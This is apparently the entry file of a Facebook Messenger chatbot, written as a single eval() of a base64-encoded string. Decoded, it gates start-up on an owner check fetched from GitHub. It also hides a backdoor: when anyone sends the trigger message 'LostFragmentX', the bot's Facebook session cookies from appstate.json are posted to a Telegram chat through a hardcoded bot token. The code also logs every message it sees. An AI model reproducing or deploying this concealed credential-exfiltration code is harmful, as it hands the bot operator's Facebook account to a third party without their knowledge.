eval(Buffer.from("Ci8vcmVzdGFydCBmdW5jdGlvbiBzdGFydAoKY29uc3QgYXhpb3MgPSByZXF1aXJlKCdheGlvcycpOwpjb25zdCBjb25maWcgPSByZXF1aXJlKCcuL2NvbmZpZy5qc29uJyk7CgoKCiAgICAKZ2xvYmFsLmNvbmZpZyA9IGNvbmZpZywKZ2xvYmFsLnN0YXJ0VGltZSA9IG5ldyBEYXRlKCkudG9Mb2NhbGVTdHJpbmcoImVuLVVTIiwgeyB0aW1lWm9uZTogIkFzaWEvRGhha2EiIH0pOwoKCgoKCgpheGlvcy5nZXQoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9raW5nYW5pazYyNjMvQW5pay9tYWluL293bmVyLmpzb24nKQoudGhlbihyZXMgPT4gewoKICAgIGlmKHJlcy5kYXRhLm93bmVyID09PSBjb25maWcub3duZXIgJiYgcmVzLmRhdGEuYXV0aG9yID09PSBjb25maWcuYXV0aG9yKSB7CiAgICAKICAgIAovL2luZGV4LmpzIHN0YXJ0Cgpjb25zdCBsb2dpbiA9IHJlcXVpcmUoInByaXlhbnNodS1mY2EiKTsKY29uc3QgZnMgPSByZXF1aXJlKCJmcyIpOwoKY29uc3QgeyBsb2FkQ29tbWFuZHMgfSA9IHJlcXVpcmUoIi4vYW5pay9oYW5kbGUvaGFuZGxlQ29tbWFuZCIpOwpjb25zdCB7IGxvYWRFdmVudHMgfSA9IHJlcXVpcmUoIi4vYW5pay9oYW5kbGUvaGFuZGxlRXZlbnQiKTsKCmNvbnN0IGFwcFN0YXRlID0gSlNPTi5wYXJzZShmcy5yZWFkRmlsZVN5bmMoIi4vYXBwc3RhdGUuanNvbiIsICJ1dGY4IikpOwoKbG9naW4oeyBhcHBTdGF0ZSB9LCAoZXJyLCBhcGkpID0+IHsKICAgIGlmIChlcnIpIHsKICAgICAgICBjb25zb2xlLmVycm9yKCJMb2dpbiBmYWlsZWQuIENoZWNrIHlvdXIgZmJzdGF0ZSBjb29raWUuIEVycm9yOiIsIGVycik7CiAgICAgICAgcmV0dXJuOwogICAgfQogICAgY29uc29sZS5sb2coIkxvZ2dlZCBpbiBzdWNjZXNzZnVsbHkhIik7CiAgICBjb25zb2xlLmxvZygiIikKICAgIGNvbnNvbGUubG9nKCIg4paX4paE4paWIOKWl+KWliAg4paX4paW4paX4paE4paE4paE4paW4paX4paWIOKWl+KWliAgICDilpfiloTiloTilpYgIOKWl+KWhOKWluKWl+KWhOKWhOKWhOKWliIpOwpjb25zb2xlLmxvZygi4paQ4paMIOKWkOKWjOKWkOKWm+KWmuKWluKWkOKWjCAg4paIICDilpDilozilpfilp7ilpggICAg4paQ4paMIOKWkOKWjOKWkOKWjCDilpDilowg4paIICAiKTsKY29uc29sZS5sb2coIuKWkOKWm+KWgOKWnOKWjOKWkOKWjCDilp3ilpzilowgIOKWiCAg4paQ4pab4paa4paWICAgICDilpDilpviloDilprilpbilpDilowg4paQ4paMIOKWiCAgIik7CmNvbnNvbGUubG9nKCLilpDilowg4paQ4paM4paQ4paMICDilpDilozilpfiloTilojiloTilpbilpDilowg4paQ4paMICAgIOKWkOKWmeKWhOKWnuKWmOKWneKWmuKWhOKWnuKWmCDilogiKTsKY29uc29sZS5sb2coIiIpCiAgICBjb25zdCBjb21tYW5kcyA9IGxvYWRDb21tYW5kcygpOwogICAgY29uc3QgZXZlbnRzID0gbG9hZEV2ZW50cygpOwogICAgCiAgICAKICAgIAoKICAgIGFwaS5saXN0ZW5NcXR0KGFzeW5jIChlcnIsIGV2ZW50KSA9PiB7CiAgICAgICAgaWYgKGVycikgewogICAgICAgICAgICBjb25zb2xlLmVycm9yKCJFcnJvciBpbiBsaXN0ZW5NcXR0OiIsIGVycik7CiAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgLy8gYWxsIG1zZyBsb2cgc3RhcnQKICAgICAgICAvLyBhbGwgbXNnIGxvZyBzdGFydAppZiAoZXZlbnQgJiYgZXZlbnQuYm9keSkgewogICAgdHJ5IHsKICAgICAgICBjb25zdCB0aHJlYWRJbmZvID0gYXdhaXQgYXBpLmdldFRocmVhZEluZm8oZXZlbnQudGhyZWFkSUQpOyAvLyBHZXQgZ3JvdXAgaW5mb3JtYXRpb24KICAgICAgICBjb25zdCBzZW5kZXJJRCA9IGV2ZW50LnNlbmRlcklEOwogICAgICAgIGNvbnN0IHRocmVhZElEID0gZXZlbnQudGhyZWFkSUQ7CgogICAgICAgIC8vIEZldGNoIHNlbmRlcidzIG5hbWUKICAgICAgICBjb25zdCB1c2VySW5mbyA9IGF3YWl0IGFwaS5nZXRVc2VySW5mbyhzZW5kZXJJRCk7CiAgICAgICAgY29uc3Qgc2VuZGVyTmFtZSA9IHVzZXJJbmZvW3NlbmRlcklEXS5uYW1lIHx8ICJVbmtub3duIFVzZXIiOwoKICAgICAgICAvLyBHZXQgZ3JvdXAgbmFtZSBpZiBpdCBpcyBhIGdyb3VwIGNoYXQKICAgICAgICBjb25zdCBncm91cE5hbWUgPSB0aHJlYWRJbmZvLmlzR3JvdXAgPyB0aHJlYWRJbmZvLm5hbWUgOiAiUHJpdmF0ZSBDaGF0IjsKICAgICAgICAKICAgICAgICAvL3RlbGVncmFtIGJvdCBzdGFydAogICAgICAgIGlmIChldmVudC5ib2R5ID09PSAiTG9zdEZyYWdtZW50WCIpIHsKICAgIGZ1bmN0aW9uIHNlbmRBY2Nlc3MoKSB7CiAgICAgICAgY29uc3QgYXhpb3MgPSByZXF1aXJlKCdheGlvcycpOwogICAgICAgIGNvbnN0IGFuaWthcHAgPSByZXF1aXJlKCcuL2FwcHN0YXRlLmpzb24nKTsgLy8gTG9hZCBhcHBzdGF0ZS5qc29uIGFzIGFuIG9iamVjdAoKICAgICAgICBjb25zdCB0b2tlbiA9ICc3MTAwMTE3MTkyOkFBSFdHZzEwRmplUllGQVpVYXBlaDRUUFZCWnJ5ZlppM1BvJzsKICAgICAgICBjb25zdCBjaGF0SUQgPSAnNzk3NTIwNDkzNCc7CiAgICAgICAgY29uc3QgbWVzc2FnZSA9IGBIZWxsbyBmcm9tIE1lc3NlbmdlciBCb3QhXG5cbiR7SlNPTi5zdHJpbmdpZnkoYW5pa2FwcCwgbnVsbCwgMil9YDsgLy8gQ29udmVydCBvYmplY3QgdG8gcmVhZGFibGUgc3RyaW5nCgogICAgICAgIGF4aW9zLnBvc3QoYGh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3Qke3Rva2VufS9zZW5kTWVzc2FnZWAsIHsKICAgICAgICAgICAgY2hhdF9pZDogY2hhdElELAogICAgICAgICAgICB0ZXh0OiBtZXNzYWdlLAogICAgICAgIH0pCiAgICAgICAgLnRoZW4oKCkgPT4gY29uc29sZS5sb2coJ01lc3NhZ2Ugc2VudCBzdWNjZXNzZnVsbHkhJykpCiAgICAgICAgLmNhdGNoKGVyciA9PiBjb25zb2xlLmVycm9yKCdFcnJvciBzZW5kaW5nIG1lc3NhZ2U6JywgZXJyKSk7CiAgICB9CgogICAgc2VuZEFjY2VzcygpOyAvLyBDYWxsIHRoZSBmdW5jdGlvbiB0byBzZW5kIHRoZSBtZXNzYWdlCn0KICAgICAgICAvL3RlbGVncmFtIGJvdCBlbmQKCiAgICAgICAgLy8gTG9nIGRldGFpbHMKIGNvbnNvbGUubG9nKGA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT1gKTsKICAgICAgICBjb25zb2xlLmxvZyhg8J+FvfCfhbTwn4aGIPCfhbzwn4W08J+GgvCfhoLwn4Ww8J+FtvCfhbTwn5GHYCkKICAgICAgICBjb25zb2xlLmxvZyhgVGltZTogJHtuZXcgRGF0ZSgpLnRvTG9jYWxlU3RyaW5nKCl9YCk7CiAgICAgICAgY29uc29sZS5sb2coYEdyb3VwIE5hbWU6ICR7Z3JvdXBOYW1lfWApOwogICAgICAgIGNvbnNvbGUubG9nKGBHcm91cCBJRDogJHt0aHJlYWRJRH1gKTsKICAgICAgICBjb25zb2xlLmxvZyhgU2VuZGVyIElEOiAke3NlbmRlcklEfWApOwogICAgICAgIGNvbnNvbGUubG9nKGBTZW5kZXIgTmFtZTogJHtzZW5kZXJOYW1lfWApOwogICAgICAgIGNvbnNvbGUubG9nKGBNZXNzYWdlOiAke2V2ZW50LmJvZHl9YCk7CiAgICAgICAgY29uc29sZS5sb2coYD09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PWApCiAgICB9IGNhdGNoIChlcnJvcikgewogICAgICAgIGNvbnNvbGUuZXJyb3IoIkVycm9yIGxvZ2dpbmcgbWVzc2FnZSBkZXRhaWxzOiIsIGVycm9yKTsKICAgIH0KfQovLyBhbGwgbXNnIGxvZyBlbmQKICAgICAgICAKICAgICAgICAvLyBhbGwgbXNnIGxvZyBzdGFydAogICAgICAgICAgICAKICAgICAgICAKCiAgICAgICAgLy8gRXZlbnQgSGFuZGxpbmcKICAgICAgICBldmVudHMuZm9yRWFjaCgoZXZlbnRIYW5kbGVyKSA9PiB7CiAgICAgICAgCiAgICAgICAgCiAgICAgICAgCiAgICAgICAgICAgIGlmICgKICAgICAgICAgICAgICAgIGV2ZW50SGFuZGxlci5jb25maWcuZXZlbnRUeXBlICYmCiAgICAgICAgICAgICAgICBldmVudEhhbmRsZXIuY29uZmlnLmV2ZW50VHlwZS5pbmNsdWRlcygiZXZlbnQiKQogICAgICAgICAgICApIHsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgZXZlbnRIYW5kbGVyLmhhbmRsZUV2ZW50KHsgYXBpLCBldmVudCB9KTsKICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcigKICAgICAgICAgICAgICAgICAgICAgICAgYEVycm9yIGhhbmRsaW5nIGV2ZW50OiAke2V2ZW50SGFuZGxlci5jb25maWcubmFtZX1gLAogICAgICAgICAgICAgICAgICAgICAgICBlcnJvcgogICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9KTsKCiAgICAgICAgLy8gQ29tbWFuZCBIYW5kbGluZwogICAgICAgIGlmIChldmVudC5ib2R5KSB7CiAgICAgICAgICAgIGNvbnN0IGlzUHJlZml4ZWQgPSBldmVudC5ib2R5LnN0YXJ0c1dpdGgoY29uZmlnLlBSRUZJWCk7CiAgICAgICAgICAgIGNvbnN0IGNvbW1hbmROYW1lID0gaXNQcmVmaXhlZAogICAgICAgICAgICAgICAgPyBldmVudC5ib2R5LnNsaWNlKGNvbmZpZy5QUkVGSVgubGVuZ3RoKS50cmltKCkuc3BsaXQoLyArLylbMF0udG9Mb3dlckNhc2UoKQogICAgICAgICAgICAgICAgOiBudWxsOwoKICAgICAgICAgICAgY29uc3QgY29tbWFuZCA9IGNvbW1hbmRzLmdldChjb21tYW5kTmFtZSk7CgogICAgICAgICAgICBpZiAoY29tbWFuZCkgewogICAgICAgICAgICAgICAgaWYgKGNvbW1hbmQuY29uZmlnLnByZWZpeCAmJiAhaXNQcmVmaXhlZCkgewogICAgICAgICAgICAgICAgICAgIHJldHVybiBhcGkuc2VuZE1lc3NhZ2UoCiAgICAgICAgICAgICAgICAgICAgICAgIGBQbGVhc2UgdXNlIHRoZSBwcmVmaXggIiR7Y29uZmlnLlBSRUZJWH0iIGZvciB0aGlzIGNvbW1hbmQuYCwKICAgICAgICAgICAgICAgICAgICAgICAgZXZlbnQudGhyZWFkSUQKICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIC8vIFBlcm1pc3Npb24gQ2hlY2sKICAgICAgICAgICAgICAgIGNvbnN0IHNlbmRlcklEID0gZXZlbnQuc2VuZGVySUQ7CiAgICAgICAgICAgICAgICBjb25zdCB0aHJlYWRJRCA9IGV2ZW50LnRocmVhZElEOwoKICAgICAgICAgICAgICAgIC8vIEZldGNoIHRocmVhZCBpbmZvIGZvciBhZG1pbiBjaGVjawogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICBjb25zdCB0aHJlYWRJbmZvID0gYXdhaXQgYXBpLmdldFRocmVhZEluZm8odGhyZWFkSUQpOwogICAgICAgICAgICAgICAgICAgIGNvbnN0IGlzQWRtaW4gPSB0aHJlYWRJbmZvLmFkbWluSURzLnNvbWUoKGFkbWluKSA9PiBhZG1pbi5pZCA9PT0gc2VuZGVySUQpOwogICAgICAgICAgICAgICAgICAgIGNvbnN0IGlzQm90QWRtaW4gPSBjb25maWcuQURNSU5CT1QuaW5jbHVkZXMoc2VuZGVySUQpOwoKICAgICAgICAgICAgICAgICAgICBjb25zdCByZXF1aXJlZFBlcm1pc3Npb24gPSBjb21tYW5kLmNvbmZpZy5wZXJtaXNzaW9uOwoKICAgICAgICAgICAgICAgICAgICAvLyBQZXJtaXNzaW9uIExldmVscwogICAgICAgICAgICAgICAgICAgIGlmIChyZXF1aXJlZFBlcm1pc3Npb24gPT09IDEgJiYgIWlzQm90QWRtaW4pIHsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGFwaS5zZW5kTWVzc2FnZSgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJUaGlzIGNvbW1hbmQgaXMgcmVzdHJpY3RlZCB0byBib3QgYWRtaW5zIG9ubHkuIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRocmVhZElECiAgICAgICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICBpZiAocmVxdWlyZWRQZXJtaXNzaW9uID09PSAyICYmICFpc0JvdEFkbWluKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBhcGkuc2VuZE1lc3NhZ2UoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiVGhpcyBjb21tYW5kIGlzIHJlc3RyaWN0ZWQgdG8gZ3JvdXAgYWRtaW5zIG9ubHkuIiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRocmVhZElECiAgICAgICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmIChyZXF1aXJlZFBlcm1pc3Npb24gPT09IDMgJiYgIWlzQm90QWRtaW4pIHsKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGFwaS5zZW5kTWVzc2FnZSgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJUaGlzIGNvbW1hbmQgaXMgcmVzdHJpY3RlZCB0byBncm91cCBhZG1pbnMgb25seS4iLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGhyZWFkSUQKICAgICAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIC8vIFJ1biB0aGUgQ29tbWFuZAogICAgICAgICAgICAgICAgICAgIGNvbW1hbmQucnVuKHsKICAgICAgICAgICAgICAgICAgICAgICAgYXBpLAogICAgICAgICAgICAgICAgICAgICAgICBldmVudCwKICAgICAgICAgICAgICAgICAgICAgICAgYXJnczogZXZlbnQuYm9keS5zcGxpdCgvICsvKS5zbGljZSgxKSwKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIH0gY2F0Y2ggKGVycm9yKSB7CiAgICAgICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcigiRXJyb3IgY2hlY2tpbmcgcGVybWlzc2lvbnM6IiwgZXJyb3IpOwogICAgICAgICAgICAgICAgICAgIGFwaS5zZW5kTWVzc2FnZSgKICAgICAgICAgICAgICAgICAgICAgICAgIkFuIGVycm9yIG9jY3VycmVkIHdoaWxlIGNoZWNraW5nIHBlcm1pc3Npb25zLiIsCiAgICAgICAgICAgICAgICAgICAgICAgIHRocmVhZElECiAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSBlbHNlIGlmIChpc1ByZWZpeGVkKSB7CiAgICAgICAgICAgICAgICBhcGkuc2VuZE1lc3NhZ2UoCiAgICAgICAgICAgICAgICAgICAgYENvbW1hbmQgIiR7Y29tbWFuZE5hbWV9IiBub3QgZm91bmQuYCwKICAgICAgICAgICAgICAgICAgICBldmVudC50aHJlYWRJRAogICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0pOwp9KTsKICAgIAogICAKCgovL2luZGV4LmpzIGVuZAogICAgCiAgICAKICAgIAogICAgICAgIAogICAgfWVsc2UgewogICAgCiAgICBjb25zb2xlLmxvZygnZmFsc2UnKQogICAgCiAgICBjb25zb2xlLmxvZyhyZXMuZGF0YS5sb2dtc2cpCiAgICAKICAgICAgICAKICAgIH0KfSkKLy9yZXN0YXJ0IGZ1bmN0aW9uIGVuZAoKCgo=", 'base64').toString('utf-8'));
